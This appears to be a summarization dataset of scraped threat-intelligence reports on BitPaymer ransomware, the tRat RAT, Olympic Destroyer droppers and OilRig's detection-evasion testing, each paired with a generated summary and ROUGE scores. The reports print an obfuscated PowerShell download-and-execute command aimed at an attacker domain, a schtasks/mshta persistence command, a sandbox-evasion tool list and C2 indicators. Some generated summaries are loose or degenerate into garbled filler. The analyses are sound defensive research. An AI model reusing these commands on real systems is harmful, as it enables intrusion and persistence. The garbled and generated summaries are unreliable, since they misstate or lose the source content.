sophisticated, the malware contained multiple antianalysis features that overlapped with Dridex. Later technical analysis of BitPaymer indicated that it had been developed by INDRIK SPIDER, suggesting the group had expanded its criminal operation to include ransomware as a monetization strategy.The beginning of 2017 also brought a turning point in INDRIK SPIDER's operation of Dridex. Dridex spam campaigns significantly declined, with new campaigns moving from high volume and frequency, to smaller, targeted distribution. The rapid development of Dridex also slowed during this time, with fewer versions released during 2017 than in previous Falcon Intelligence has observed two different methods used to deploy BitPaymer once the domain controllers are compromised. In one instance, only the domain controllers and other critical infrastructure, like payroll servers, were targeted and PowerShell Empire was used to download and execute the BitPaymer malware directly on these servers. In another instance, the BitPaymer malware was downloaded to a network share in the victim network, and a startup script called gpupdate.bat was pushed to all the hosts on the network via Group Policy Object (GPO), from the domain controllers. This script copied BitPaymer from the share and executed it on each host in the network, encrypting thousands of machines. The PDB string also contains the prefix string S:\Work\, which is identical to other Dridex modules, including those shown in Table 1. The ransomware also contains code from the Dridex modules, with some variants of the ransomware sharing up to 69 percent of their code with the Dridex loader.MODULE NAME DESCRIPTION loader Downloads and installs the core Dridex modules, including the worker vnc Provides remote desktop access netcheck Checks network connectivity spammer Spam module worker Core component responsible for banking trojan functionality, including keylogging, web injects, download and execute secondstage payloads, etc. trendmicro Whitelists Dridex modules from TrendMicro antivirus detection wp_decrypt BitPaymer decryption toolTable 1. Dridex Modules Sharing the Same PDB Path PrefixAntiAnalysisBoth variants of the BitPaymer malware feature multiple techniques to hinder analysis. The malware developers have employed a combination of encrypted strings, string hashes and dynamic API resolution to ensure that no strings exist in the binary.Encrypted Strings TableThe BitPaymer malware contains a small table of encrypted strings in the rdata section of the binary. These strings use standard RC4 encryption in which the first 40 bytes form the RC4 key, and the remaining data contains the encrypted strings table. These strings are temporarily decrypted ondemand during runtime. The strings in the decrypted strings table are separated by a null byte and are referenced by their order. This string table encryption method is identical to the method used in other Dridex malware, including the 40byte key length and the position of the table in the rdata section. The strings include, among other strings, the RSA public key used in the ransomware encryption, the The malware BitPaymer uses a variety of techniques to gain persistence on the host system. If elevated privileges are not obtained, the malware falls back to using the same Windows registry run key as the older mode variant for persistence HKCU\Software\Microsoft\Windows\CurrentVersion\Run . However, if the malware is successful in elevating privileges, it begins to enumerate existing Windows services on the host that are configured to run as LocalSystem . The malware selects services that are currently not active and ignores services that launch the executables svchost.exe and lsass.exe . For each service, the malware attempts to take control of the service's executable first using icacls.exe with the /reset flag to reset the executable's permissions, then using takeown.exe with the /F flag to take ownership of the executable.If this is successful, the malware creates a :0 alternate data stream in the executable and copies the executable's own contents to the stream. This can be used to restore the executable later. Then the malware replaces the contents of the executable with a copy of itself and launches the service. The file modified time of the executable is also artificially changed to 00:00:00 UTC . The ITSecurity report states that BitPaymer is a ransomwaretype malware that encrypts files and demands a ransom in exchange for the decryption key. The malware is capable of targeting both fixed and removable drives, as well as network shares. The malware also attempts to enumerate the sessions for each user logged onto the infected host and create a new process, using the token of each user. This new process will first spawn a net.exe process with the view argument to gather a list of network accessible hosts. For each host, BitPaymer spawns another net.exe process with command net view <host> using the newly discovered host as a parameter. This will return a list of network shares available to the impersonated user on the host. Once a list of all available shares has been gathered, BitPaymer attempts to mount them to be encrypted. The malware recursively iterates through all files and directories. For each file, the name and path are compared against a list of excluded filenames and two lists of excluded directory names. If the file name and path do not match any regular expressions in the exclusion lists, the file is encrypted. The file encryption algorithm imports a hardcoded RSA 1024bit public key from the encrypted strings table using CryptImportPublicKeyInfo , and for each file, generates a 128bit RC4 key using CryptGenKey . The RC4 key is then used to encrypt the file in place. Once it is encrypted, the file is moved to a new file with the same name, and the file extension is appended with the keyword .locked . The RC4 key is exported as a SIMPLEBLOB encrypted with the RSA key and Base64encoded. A second file is created with the same name as the encrypted file, except it is appended with the extension . The BitPaymer ransomware is a sophisticated piece of malware that uses a combination of encryption and ransom note to extort money from its victims. The malware encrypts files on the victim's computer and then demands a ransom in Bitcoin (BTC) to decrypt the files. The ransom note contains specific instructions on how to pay the ransom, as well as instructions on how to contact the malware's operators. The malware's operators are willing to demonstrate decryption legitimacy by offering to decrypt two test files of the victim's choice. Additionally, the malware's operators are not willing to negotiate on the ransom amount, explicitly stating that the victim can use multiple Bitcoin exchanges to obtain the number of BTC required, and the exchange rate should be calculated based on the rate posted on the cryptocurrency exchange Bittrex. CrowdStrike Falcon(r) has successfully prevented BitPaymer from encrypting files on the host. The following table contains SHA256 hashes for BitPaymer decryptor samples analyzed by Falcon Intelligence. SHA256 Hash Build Time (UTC) f0e600bdca5c6a5eae155cc82aad718fe68d7571b7c106774b4c731baa01a50c 20170607 15:08:59 b44e61de54b97c0492babbf8c56fad0c10876db403c40638a24b5bc893fd87587 20171107 14:40:50 91c0c6ab8a1fe428958f33da590bdd52baec868c7011461da8a8972c3d989d42 20180501 14:43:04 f1d69b69f53af9ea83fe8281e5c1745737fd42977597491f942755088c994d8e 20180501 00:35:47 39e7a9b0ea00316b232b3d0f8c511498ca5b6aee95abad0c3f;en;{'r': 0.3684210526315789, 'p': 0.9425493716337523, 'f': 0.529767907159771};{'r': 0.27119129438717066, 'p': 0.8801115241635687, 'f': 0.414623463999359};{'r': 0.36701754385964913, 'p': 0.9389587073608617, 'f': 0.5277497436885299}
https://www.proofpoint.com/us/threat-insight/post/trat-new-modular-rat-appears-multiple-email-campaigns;tRat: New modular RAT appears in multiple email campaigns;"Proofpoint StaffOverviewTA505 is one of the most prolific actors Proofpoint tracks. The group was responsible for hundreds of Dridex campaigns beginning in 2014 and massive Locky campaigns in 2016 and 2017, many of which involved hundreds of millions of malicious messages distributed worldwide. More recently, the group has been distributing a variety of remote access Trojans (RATs), among other information gathering, loading, and reconnaissance tools, including a previously undescribed malware we have dubbed tRat. tRat is a modular RAT written in Delphi and has appeared in campaigns in September and October of this year (one of them by TA505). In this blog we discuss the components of these campaigns and provide a brief analysis of the malware.CampaignsOn September 27, 2018, Proofpoint detected an email campaign in which malicious Microsoft Word documents used macros to download a previously undocumented RAT. The documents abused the Norton brand, with the document names and embedded image suggesting that they were protected by a security product. Subject lines on the messages reinforced the social engineering, stating ""I have securely shared file(s) with you."" Enabling the embedded macros installed tRat. This particular campaign was spread by an unattributed actor, as was an apparently related campaign on September 29 that used a TripAdvisor lure (Figure 2).Figure 1: Lure document from campaign on September 27, 2018, using stolen branding and social engineering to trick recipients into enabling malicious macrosFigure 2: TripAdvisor lure used in a September 29, 2018, campaign, again using stolen branding and social engineering to trick users into enabling macrosOn October 11, we observed another email campaign distributing tRAT, this time by TA505. This campaign was more sophisticated, using both Microsoft Word and Microsoft Publisher files, and varying subject lines and senders. This campaign appeared to target users at commercial banking institutions.In this campaign, messages bearing malicious Microsoft Publisher documents purported to be from ""Invoicing"", with various sending addresses. Example subject lines were ""Inovice (sic) [random digits] - [random digits]"" and had attachments with names such as ""inv-399503-03948.pub"". Alternatively, the emails with malicious Microsoft Word attachments appeared to be be from ""Vanessa Brito"" with various actual sending addresses. Attachments were named ""Report.doc"" in these messages, with example subject lines such as ""Call Notification - [random digits] - [random digits]Figure 3 shows a sample email:Figure 3: Sample email from campaign on October 11, 2018In all cases, the attachments contained macros that, when enabled, downloaded tRat.Figure 4: Sample lure document from October 11, 2018AnalysisWhile we continue to analyze this malware, we have established the functioning of a number of features. In the analyzed sample, tRat achieves persistence by copying the binary to:C:\Users\<user>\AppData\Roaming\Adobe\Flash Player\Services\Frame Host\fhost.exeNext, tRat creates a LNK file in the Startup directory that executes the binary on startup:C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bfhost.lnkMost of tRat's important strings are stored encrypted and hex-encoded. A Python script is available [1] on our Github that can be used to decrypt its strings.tRat uses TCP port 80 for command and control (C&C) communications, data are encrypted and transmitted hex-encoded. To generate the decryption key, tRat concatenates three strings and the result is uppercase hex-encoded. The strings from the analyzed sample are shown below:""Fx@%gJ_2oK"" ""AC8FFF33D07229BF84E7A429CADC33BFEAE7AC4A87AE33ACEAAC8192A68C55A6"" ""&LmcF7R2m""It is currently unclear whether these strings change from sample to sample. In addition to generating a key, tRat uses a 1536-byte table in the decryption process. As of this writing, we were not able to ascertain the meaning of all elements of the table or determine if it changes. However, we were able to determine that decryption involves XORing various values from the table with the encrypted data. The table indexes are based on the key value, derived as described above. The table [2] from the analyzed sample and a Python script [3] is available on our Github that can be used to decrypt the communications.tRat's initial phone-home network request is called ""AUTH_INF"". A decrypted example looks like:MfB5aV1dybxQNLfg:D29A79D6CD2F47389A66BB5F2891D64C8A87F05AE3E1C6C5CBA4A79AA5ECA29F8E8C8FFCA6A2892B8B6EThis string contains two substrings separated by a "":"". The first substring is a hardcoded identifier stored as an encrypted string. The second substring contains encrypted system data as shown below:FASHYEOHAL/nXAiDQWdGwORzt:3A176D130C266A4DThese data contain the computer name of the infected host, the system username and the tRat bot ID, although we have not yet determined how the bot ID is generated.In response to the AUTH_INF phone-home, the C&C will respond with ""[P]"" or a command list. If tRat receives ""[P],"" it sends ""[G]"" in reply. While this appears to operate like a command poll, the precise format of the command list, commands, and module data are unknown. Currently, we believe that the only supported command in the loader is ""MODULE,"" which contains at least a module name and export name. To receive a module, tRat performs the following sequence of actions:Send ""[GET_MODULE]""If ""[WAIT_FOR_AUTH_INF]"" is received, send AUTH_INF dataIf ""[WAIT_FOR_MODULE_NAME]"" is received, send module nameThe response could be one of the following: ""[ERR_MODULE_NOT_FOUND]"" ""[ACCESS_DENIED]"" Module lengthIf module length is received, send a ""[READY]""Receive moduleThe module itself is encrypted similarly to the C&C communications, but appears to use different keys that are sent with the moduleOnce decrypted, the modules are loaded as a DLL and executed using the received export nameCurrently we have not observed any modules delivered by a C&C, so we are unsure of what functionality they might add.ConclusionTA505, because of the volume, frequency, and sophistication of their campaigns, tends to move the needle on the email threat landscape. It is not unusual for the group to test new malware and never return to distributing it as they have with BackNet, Cobalt Strike, Marap, Dreamsmasher, and even Bart during their ransomware campaigns. However, we observe these new strains carefully as they have also adopted new malware like Locky or less widely distributed malware like FlawedAmmyy at scale following similar tests. Moreover, their adoption of RATs this year mirrors a broader shift towards loaders, stealers, and other malware designed to reside on devices and provide long-term returns on investment to threat actors.Indicators of Compromise (IOCs)IOC IOC Type Description cd0f52f5d56aa933e4c2129416233b52a391b5c6f372c079ed2c6eaca1b96b85 SHA256 tRat sample hash, September 27 campaign cdb8a02189a8739dbe5283f8bc4679bf28933adbe56bff6d050bad348932352b SHA256 tRat sample hash, October 11 campaign 51.15.70[.]74 IP C&CReferences[1] https://github.com/EmergingThreats/threatresearch/blob/master/tRat/decrypt_str.py[2] https://github.com/EmergingThreats/threatresearch/blob/master/tRat/table[3] https://github.com/EmergingThreats/threatresearch/blob/master/tRat/decrypt_comms.py";"The ITSecurity report has been summarized as follows: Proofpoint StaffOverviewTA505 is one of the most prolific actors Proofpoint tracks. The group was responsible for hundreds of Dridex campaigns beginning in 2014 and massive Locky campaigns in 2016 and 2017, many of which involved hundreds of millions of malicious messages distributed worldwide. More recently, the group has been distributing a variety of remote access Trojans (RATs), among other information gathering, loading, and reconnaissance tools, including a previously undocumented malware we have dubbed tRat. tRat is a modular RAT written in Delphi and has appeared in campaigns in September and October of this year (one of them by TA505). In this blog we discuss the components of these campaigns and provide a brief analysis of the malware.CampaignsOn September 27, 2018, Proofpoint detected an email campaign in which malicious Microsoft Word documents used macros to download a previously undocumented RAT. The documents abused the Norton brand, with the document names and embedded image suggesting that they were protected by a security product. Subject lines on the messages reinforced the social engineering, stating ""I have securely shared file(s) with you."" Enabling the embedded macros installed tRat. This particular campaign was spread by an unattributed actor, as was an apparently related campaign on September 29 that used a TripAdvisor lure (Figure 2).Figure 1: Lure document from campaign on September 27, 2018, using stolen branding and social engineering to trick recipients into enabling malicious macrosFigure 2: TripAdvisor lure used in a September 29,";en;{'r': 0.2953667953667954, 'p': 0.9745222929936306, 'f': 0.45333332976346785};{'r': 0.25054466230936817, 'p': 0.9663865546218487, 'f': 0.39792387216262975};{'r': 0.2953667953667954, 'p': 0.9745222929936306, 'f': 0.45333332976346785}
https://research.checkpoint.com/2018/new-strain-of-olympic-destroyer-droppers/;New Strain of Olympic Destroyer Droppers;"Over the last few weeks, we have noticed new activity from Hades, the APT group behind the infamous Olympic Destroyer attack. Moreover, this new wave of attack shares a lot with those previously attributed to the group but it seems that this time we are witnessing significant changes that may hint at a new evolution from the group.The samples we found indicate once again that the group is aware of the various studies made surrounding its activities and is working to make it difficult for the various research bodies to identify its attacks and attribute them to it.In our research we've compared and analyzed these newly discovered samples and IOCs, alongside samples previously observed by other researchers in order to create a better, more complete and up-to-date picture of the first stage tactics, techniques and procedures used by the threat group.Where it All BeganThe cyber-attack on the Winter Olympic Games 2018 in South Korea disrupted the IT infrastructure of the event only for a short period of time, but grabbed a lot of headlines in the media, as the security community was trying to find out what happened and who stood behind the attack.During their research, the security community uncovered a Wiper malware with lateral movement capabilities that was later dubbed the Olympic Destroyer.Multiple attempts at attribution were made, but the threat group behind these attacks proved to be a ""master at deception"" and incorporated multiple false flags inside the malware, which caused false attributions.Months later, Kaspersky was able to identify the initial attack vector behind these attacks: Spear-phishing e-mails with malicious documents were used as a first step to infiltrate the networks of companies that were associated with the upcoming Olympic Games.Connecting the malicious documents to the attack made it possible to track the threat group's activities by following similar documents. The threat group seemed to show interest beyond South Korea as multiple organizations worldwide were also targeted.The two first Hades dropper samples were originally reported by McAfee in January this year , prior to the Olympic Games and utilized two different techniques: embedded files and malicious macros.Going forward, only samples with malicious macros were attributed to Hades.Hades is known to utilize publicly available tools for reconnaissance and post-exploitation. This makes analysis and detection of the first stage of the attack even more important as it becomes one of the only ways to distinguish this group's operations from others' and to track their activity worldwide.Macro EvolutionIn order to demonstrate how Hades' macros evolved over time we used macros call graph generator: Vba2Graph.In the following infographic, you will notice which features were added, and how the macros' complexity increased over time. Usually, samples that are released around the same dates have the same call graph.Each sample represents a new iteration of the first variant of macros.The string encoding methods, as well as other common indicators which we will list afterwards, clearly show that at the very least, most documents were created by one threat actor, with the same set of obfuscation tools that evolved on a monthly basis.Old Infection FlowWith the exception of recent droppers, all samples above exhibited similar functionality in the first stage of their execution:More information on previous Hades campaigns can be found in Kaspersky's report.New Dropper VariantThe latest sample we discovered shows a deviation from the normal evolutionary path that Hades' macros usually take and represent a whole new variant.The sample was first uploaded to VT on the 2018-10-12 from the Ukraine. It exhibits an encoding and a code style that are similar to those used by former series of Hades droppers. Nevertheless, it introduces new features like anti-analysis and delayed execution, which were only used by the second stage payload in the past.These new features proved to be effective, as popular online sandboxes failed to see any launched processes or network activity, and with some, the dropper appeared to be totally benign.The new call graph: The sample exhibits a less complex graph, while focusing on redesign and new features.Sample DetailsMD5:cd15a7c3cb1725dc9d21160c26ab9c2eFile name:""???????????_???????_??_??????????_??????????_??????????.doc""Creation date:2018-10-09 07:23:00Author:JamesNew Infection FlowWe will go into details of the many changes which this sample introduces in each of the execution steps below:1. DOC DecoyAt first, the user is presented with a blank page.Once activated, the macros change the white text to black, and the content is revealed.The text of the document was taken from a legitimate document, available online.2. WMI - Anti AnalysisUsing WMI, the macro iterates over running processes:The returned process names are then compared against popular analysis tools, and the macro also verifies that there are at least 40 running processes. This process count is effective against sandboxes and analysis environments where there are usually a few processes running.Analysis tools list:HaCKER,MalzILlA,pRocExP,WiREShARK,HxD,PowERsheLl_iSE,idA,Olly,fiDDLEr,mALwAre,VmtoOLsd,SWingBoX,vboXTrAY,secunia,hijack,VmtoOlsd',Vbox,vMWaRE,VXsTReaM,AUtOIt,vmToOls,TcpVIeW,WiREShARK,prOCEss expLorer,VIsuAl bASiC,fiDDLErAttribution Note:The above list of tools was observed in the Powershell stage of the old variant.3. Drops HTA to DiskThe dropper writes the decoded HTA file into ""%APPDATA%\WPFT532.hta""4-5. Scheduled TaskA scheduled task was created for the HTA to be executed in the morning hours.schtasks /Create /F /SC DAILY /ST ""10:20"" /TN ""DriveCloudTaskCoreCheck"" /TR ""mshta C:\\Users\\[user]\\AppData\\Roaming\\WPFT532.htaParameters:/F - forcefully creates the task and suppresses warnings if the specified task already exists/SC - schedules a daily task/ST - start time/TN - task name6. HTA ExecutionThe HTA file utilizes VBScript to decode the next stage command line, with the same techniques and decoders from the macro stage.7-9. Powershell Download and ExecuteThe HTA code executes the following command line, with obfuscated Powershell.c:\\WiNDOws\\sYsTEM32\\Cmd.eXE /c ""Set AYW= -jOIn[CHAr[]] (40 ,39 , 40 , 78,39, 43,39 , 101, 119, 45, 79,39, 43 ,39 , 98,106 , 101 ,99 ,116 , 32 , 78,101 , 116 , 46 ,87, 39 , 43, 39 ,101 , 98 , 99 , 108, 105 ,101 ,110, 116 , 41,39 , 43 ,39,46,39,43 ,39 ,100 , 111,119 , 110 ,108 , 111 ,39,43 ,39, 97 , 100,115 ,116, 114,105 , 110 , 103,40 ,72 ,108, 39,43,39, 106,104,116 , 39 , 43 , 39 , 116 ,112, 58 , 39, 43,39 , 47, 47, 102 ,105, 110 , 100 , 117, 112 , 100, 97 ,39 , 43,39 , 116 ,101,39 ,43,39 , 109, 115 ,46,99 ,111, 109 , 47,99 , 104,39, 43,39, 101, 39 , 43 , 39,99 ,107 ,47,105 ,110,39 ,43 , 39 , 100 , 101 ,120,72,108, 106, 41,39 ,43 ,39, 52, 106 , 39,43,39 , 122,73 , 69,88, 39, 41 ,46 ,82 ,101, 112, 76 , 97,67,101, 40 ,40 ,91 , 99, 104,65 ,114 ,93,55, 50,43 ,91, 99, 104,65 , 114, 93,49,48,56, 43,91 ,99, 104,65 ,114,93,49, 48 ,54 , 41, 44,91,83,116 , 114, 73 ,110,103, 93 ,91 ,99 ,104,65, 114 ,93,51, 57 , 41, 46 ,82,101,112,76, 97, 67 ,101, 40 , 40,91,99, 104, 65, 114, 93, 53 ,50, 43 ,91 , 99 ,104, 65, 114 , 93,49,48,54, 43, 91 ,99, 104, 65,114,93 , 49 , 50 ,50,41,44, 39, 124 , 39 ,41 , 124 , 32, 46 ,32 , 40 , 32 ,36, 69, 110 ,86 , 58,67 , 79, 109 , 83, 80, 101 , 99 ,91,52 , 44 ,50, 52 ,44 ,50,53, 93 , 45 , 106,79 ,73 ,110 ,39 , 39, 41)^| . ( $pshOme[21]+$PSHoMe[30]+'x') &&Set gnPq=ECHO inVOKe-ExPRessiON (get-ItEM eNV:AYw).valUe ^| pOWERsHElL -noPRoFI -EXEcuTiONpOlI BYPASS -noNi -NoeXi -WindoWStYlE HIdDen -&& c:\\WiNDOws\\sYsTEM32\\Cmd.eXE /c %gNpq%""Powershell deobfuscation stage 1:('(N'+'ew-O'+'bject Net.W'+'ebclient)'+'.'+'downlo'+'adstring(Hl'+'jht'+'tp:'+'//findupda'+'te'+'ms.com/ch'+'e'+'ck/in'+'dexHlj)'+'4j'+'zIEX').RepLaCe(([chAr]72+[chAr]108+[chAr]106),[StrIng][chAr]39).RepLaCe(([chAr]52+[chAr]106+[chAr]122),'|')Powershell deobfuscation stage 2:(New-Object Net.Webclient).downloadstring('<http://findupdatems>[.]com/check/index')|IEXThe downloaded string is evaluated as an additional Powershell to execute. At the time of analysis, we are unable to download the second stage payload.Common IndicatorsHades' doc files and macro obfuscators have unique characteristics that can be used to distinguish them from other droppers.These characteristics are present in both the new and the old variants of the macros.MetadataThough not very distinctive, most droppers include one of the three document author names:James, john or AV.Dummy Code""If"" statement that always evaluate to ""True"":A function whose whole purpose is to return 0:Encoder FunctionStrings and second stage code appear encoded in the macros:To deobfuscate strings, a decoding function is used (MSART8 in our case).All the decoding function does is to decrease the value of each encoded character by a constant value.i.e.: if our constant value is 5, the ASCII value of each encoded character would be decreased by 5.This constant value changes between different Hades' samples.In other cases, another decoder is used to convert Hex strings to text, as a first step, prior to the aforementioned decoder:Document Decoy FunctionMost droppers use 2 methods in order to alter the document's appearance after the user has enabled macros:Remove the document decoy image cover using the following loop:Reveal the underlying text by changing its color from white to black:Initial TriggerFor initial trigger, Hades refrains from common code triggers like AutoOpen, in order to avoid static detection / analysis by emulators, and instead uses lesser known triggers in conjunction with Word ActiveX objects.More information on such triggers could be found here.Some of the triggers are used across multiple campaigns:- MultiPage1_Layout- Frame1_Layout- SystemMonitor1_GotFocus- Image1_MouseMove- ImageCombo21_ChangeNetwork Infrastructure NotesA common practice of Hades' droppers is to use compromised servers as a second stage C2.Though not much is known about Hades' infrastructure, some droppers which contacted their C2 exposed some server errors.Those errors indicate that compromised servers only act as a proxy, and the requests were in fact redirected to another server, which hosted the Empire back-end.Request generated by e160ca75a0e8c4bc9177f412b09e7a29 (first seen: 2018-06-05)Request generated by ac85b1fff1fe43ddad28bf1c4ce021c5 (first seen: 2018-10-11)Request FlowThis ""Proxy"" functionality is embedded within Empire in the form of ""Hop Listeners"":https://github.com/EmpireProject/Empire/blob/master/data/misc/hop.phpCoincidentally, there is a file_get_contents function on line 25 in hop.php, just like the one we observed in our error message above.To ConcludeHades shows no signs of slowing down their operation, as their capabilities are growing alongside their victims list.The threat actors' latest activity presented us with a new, previously unseen variant of their dropper, which introduced a deviation from their regular first stage TTPs.Every time Hades introduced a new dropper iteration, only a small amount of AV vendors could successfully detect them as malicious. This fact makes it more than likely that most of Hades' operations remain under the radar.IOCsBelow is a list of recent Hades' dropper IOCs, that didn't appear in prior publications:Dropperse160ca75a0e8c4bc9177f412b09e7a297f327ae9b70d6a2bd48e20c897f7f726e3487e2725f8c79d04ffda6de9612e25ac85b1fff1fe43ddad28bf1c4ce021c5cd15a7c3cb1725dc9d21160c26ab9c2e";Hades is known to utilize publicly available tools for reconnaissance and postexploitation. This makes analysis and detection of the first stage of the attack even more important as it becomes one of the only ways to distinguish this group's operations from others' and to track their activity worldwide.Macro EvolutionIn order to demonstrate how Hades' macros evolved over time we used macros call graph generator: Vba2Graph.In the following infographic, you will notice which features were added, and how the macros' complexity increased over time.Each sample represents a new iteration of the first variant of macros.The string encoding methods, as well as other common indicators which we will list afterwards, clearly show that at the very least, most documents were created by one threat actor, with the same set of obfuscation tools that evolved on a monthly basis.Old Infection FlowWith the exception of recent droppers, all samples above exhibited similar functionality in the first stage of their execution:More information on previous Hades campaigns can be found in Kaspersky's report.New Dropper VariantThe latest sample we discovered shows a deviation from the normal evolutionary path that Hades' macros usually take and represent a whole new variant.The sample was first uploaded to VT on the 20181012 from the Ukraine. It exhibits an encoding and a code style that are similar to those used by former series of Hades droppers. Nevertheless, it introduces new features like antianalysis and delayed execution, which were only used by the second stage payload in the past.These new features proved to be effective, as popular online sandboxes failed to see any launched processes or network activity, and with some, the dropper appeared to be totally benign.The new call graph: The sample exhibits a less complex graph, while focusing The ITSecurity report was successfully decoded. [10. ## ##. [10. [10. The report, 1 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .;en;{'r': 0.22209165687426558, 'p': 0.9545454545454546, 'f': 0.36034318092226386};{'r': 0.17727272727272728, 'p': 0.9222972972972973, 'f': 0.2973856182104699};{'r': 0.22209165687426558, 'p': 0.9545454545454546, 'f': 0.36034318092226386}
https://unit42.paloaltonetworks.com/unit42-analyzing-oilrigs-ops-tempo-testing-weaponization-delivery/;Analyzing OilRig's Ops Tempo from Testing to Weaponization to Delivery;"This post is also available in: ??? (Japanese)Gaining insight into an adversary's operational tempo in the early phases of the attack lifecycle can be very difficult. Typically, there are far fewer data points available to analyze in the reconnaissance and weaponization phases for a researcher to use to determine how quickly an adversary operates prior to direct interaction with a target in the delivery phase. While continuing research on the August 2018 attacks on a middle eastern government that delivered BONDUPDATER, Unit 42 researchers observed OilRig's testing activities and with high confidence links this testing to the creation of the weaponized delivery document used in this attack.Clearly, OilRig incorporates a testing component within their development process, as we have previously observed OilRig performing testing activities on their delivery documents and their TwoFace webshells. This testing component often involves making small modifications to their delivery documents and submitting these files to online public anti-virus scanning tools to determine the maliciousness of a submitted file and to figure out how to evade these detections. Providing a free and quick anti-virus testing service, using these online scanners aids an attacker in understanding which anti-virus engine detects their malware, thus giving the attacker a metaphorical ""quality assurance service.""To determine OilRig's operational tempo, we compared the creation times of the files created during testing, the creation time of the delivery document and the time in which the spear-phishing email was sent in the attack. We found that OilRig began its testing activities just under 6 days prior to the targeted attack and performed three waves of testing attempts on August 20th, 21st, and 26th. The tester created the final test file less than 8 hours before the creation time of a delivery document, which was then delivered via a spear-phishing email 20 minutes later.OilRig's Testing ActivitiesWhile investigating recent attacks performed by the threat actor group OilRig using their new Bondupdater version, Unit 42 researchers searched for additional Microsoft Office documents used by OilRig hoping to locate additional malware being used in other attacks during the same time period. We focused on the functionality and pivoting off the original OilRig Microsoft documents found during our recent investigation.Unit 42 researchers found 11 additional samples that were submitted across several public anti-virus testing sites, as seen in Table 1. These samples appeared to have been created by OilRig during their development and testing activities, all of which share many similarities with the delivery document used in the recent OilRig attack against a Middle Eastern government, N56.15.doc (7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00) that we have also included in Table 1. During this testing, we saw document filenames that contain the C2 we witnessed in the targeted attack above, specifically the filenames XLS-withyourface.xls and XLS-withyourface - test.xls. The similarities in metadata, macro code, and the filenames containing the C2 domain name leads us to believe these files were in fact OilRig testing their code prior to use in the targeted attack that happened on August 26th. It is interesting to note that while all the testing files were Microsoft Excel documents, the actual file used in the targeted attack was a Microsoft Word document.Hash Last Modified/Save Date Average Detection Count on First Public Submission Filename 6f522b1be1f2b6642c292bb3fb57f523ebedeb04f0d18efa2a283e79f3689a9f 8/20/2018 19:30:13 22 XLS-withyourface.xls 9b6ebc44e4452d8c53c21b0fdd8311bac10dc672309b67d7f214fbd2a08962ce 8/20/2018 19:31:54 16 XLS-withyourface.xls a5bec7573b743932329b794042f38571dd91731ae50757317bdaf9e820ec8d5e 8/20/2018 19:38:51 6 XLS-withyourface.xls 6719e80361950cdb10c4a4fcccc389c2a26eaab761c202870353fe65e8f954a3 8/21/2018 6:24:52 4 XLS-withyourface - test.xls 056ffc13a7a2e944f7ab8c99ea9a2d1b429bbafa280eb2043678aa8b259999aa 8/21/2018 7:58:16 18 sss.xls 216ffed357b5fe4d71848c79f77716e9ecebdd010666cdb9edaadf7a8c9ec576 8/21/2018 8:03:22 5 sss.xls 687027d966667780ab786635b0d4274b651f27d99717c5ba95e139e94ef114c3 8/21/2018 8:08:36 17 sss.xls 364e2884251c151a29071a5975ca0076405a8cc2bab8da3e784491632ec07f56 8/21/2018 8:18:36 9 sss.xls 66d678b097a2245f60f3d95bb608f3958aa0f5f19ca7e5853f38ea79885b9633 8/26/2018 5:43:07 11 sss - Copy.xls 70ff20f2e5c7fd90c6bfe92e28df585f711ee4090fc7669b3a9bd024c4e11702 8/26/2018 5:45:04 7 sss - Copy.xls 7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00 8/26/2018 13:34:00 38 N56.15.docTable 1 Files generated during testing activities and the document delivered in the related targeted attackThe metadata within the Microsoft Excel spreadsheets seen in Table 1 shows the OilRig developer began creating these testing documents on August 20, six days prior to the related targeted attack. All of the testing activity performed by OilRig occurred prior to their attack on August 26th. When cross referencing the 'Last Modified Date' dates across the testing and attack activity, it is easy to draw a timeline of activity, as seen in the timeline in Figure 1.Figure 1 Timeline of Testing and Attack ActivityOn August 20, 22 anti-virus engines detected the first iteration of XLS-withyourface.xls as malicious, as seen in the chart in Figure 2. Over the next seven minutes, the tester created two more samples whose detections lowered from 16 detections to six, respectively. Ultimately, the detection count was lowest early on August 21, still five days prior to the targeted attack. The timeline in Figure 1 shows a gap in testing activity between August 21st and August 26th, when the tester stopped their activities. However, they later continued by making modifications to the Excel document just prior to the attack on August 26th. The last iteration of testing occurring less than 8 hours before the creation time of the Word delivery document used in the targeted attack.Figure 2 Detection rate compared to the insertions and deletions that were performed in each iteration of testingThe chart in Figure 2 shows the detection rate of the file fell or rose as the tester modified the spreadsheet during each iteration of testing. These changes in detection rates allow the tester to determine if the modified portion of the file was causing detection. When analyzing this testing activity, we compared the number of changes performed in each iteration, specifically the number of lines inserted and deleted based on the GitHub file diff, to the number of detections to determine if the amount of changes had an obvious effect on the detection rate. Figure 2 shows that iterations 1 and 2, with only minimal changes, resulted in a massive drop in detections, whereas iterations 3 and 4, with a large number of changes, resulted in a small drop and large increase in detections.At a high level, the quantity of changes is not necessarily important to the tester, rather the quality of the changes helps the tester lower the detection rate while providing information on how to evade these detections. An example of a quality change was the removal of the line of code that runs the dropped VBScript using ""wscript"" in Iteration 2, which lowered the detection rate from 16 to 6. Ultimately, the tester used the knowledge gained from these testing iterations to create a delivery document that was more difficult to detect and likely to result in a successful attack. For details on the changes made in each iteration, please reference the analysis in the Appendix.What Did OilRig Learn?During OilRig's development efforts, the actors were clearly learning and adapting their development techniques. We continually witnessed the attackers submit their files to testing services only to make changes and resubmit to determine the specific contents of the file that cause anti-virus detections. The OilRig actors used the knowledge learned in this process to develop a delivery document that would evade detection, thus increasing the chances of a successful attack.Doing a differential comparison between each of the documents, allowed Unit 42 researchers to watch each iteration of code, giving a unique perspective into not only how OilRig performed their testing, but also what the actors may have learned during their efforts to lower the detection of their delivery documents. While it's impossible for us to say for certain what OilRig learned ,we can make some assumptions as to what they likely learned:Several detections of the macro hinged on the generic call to the built-in Shell function to run a dropped VBScript.Running commands in a hidden window (vbHide flag) using the Shell function results in additional detections than when using a visible window (vbNormalFocus flag).Including the string ""powershell"" within the VBScript that the macro would write to the system caused several detections.Using string obfuscation on the ""powershell"" string and the ""wscript"" string within the command run using the Shell function would result in fewer detections.What Did We Learn?Similar to the way OilRig learned to better circumvent detections, we as researchers also learned as we looked at each of the iterations. Providing us with learning opportunities helps us understand the threat actor's techniques and capabilities, as well as better pro-actively build protection mechanisms.We learned that OilRig:Made changes to documents and quickly uploaded the file for testing, with an average of 33 seconds between the file creation times and the testing time.Was not concerned about maintaining the macro's functionality during testing efforts, as the changes made by the tester in 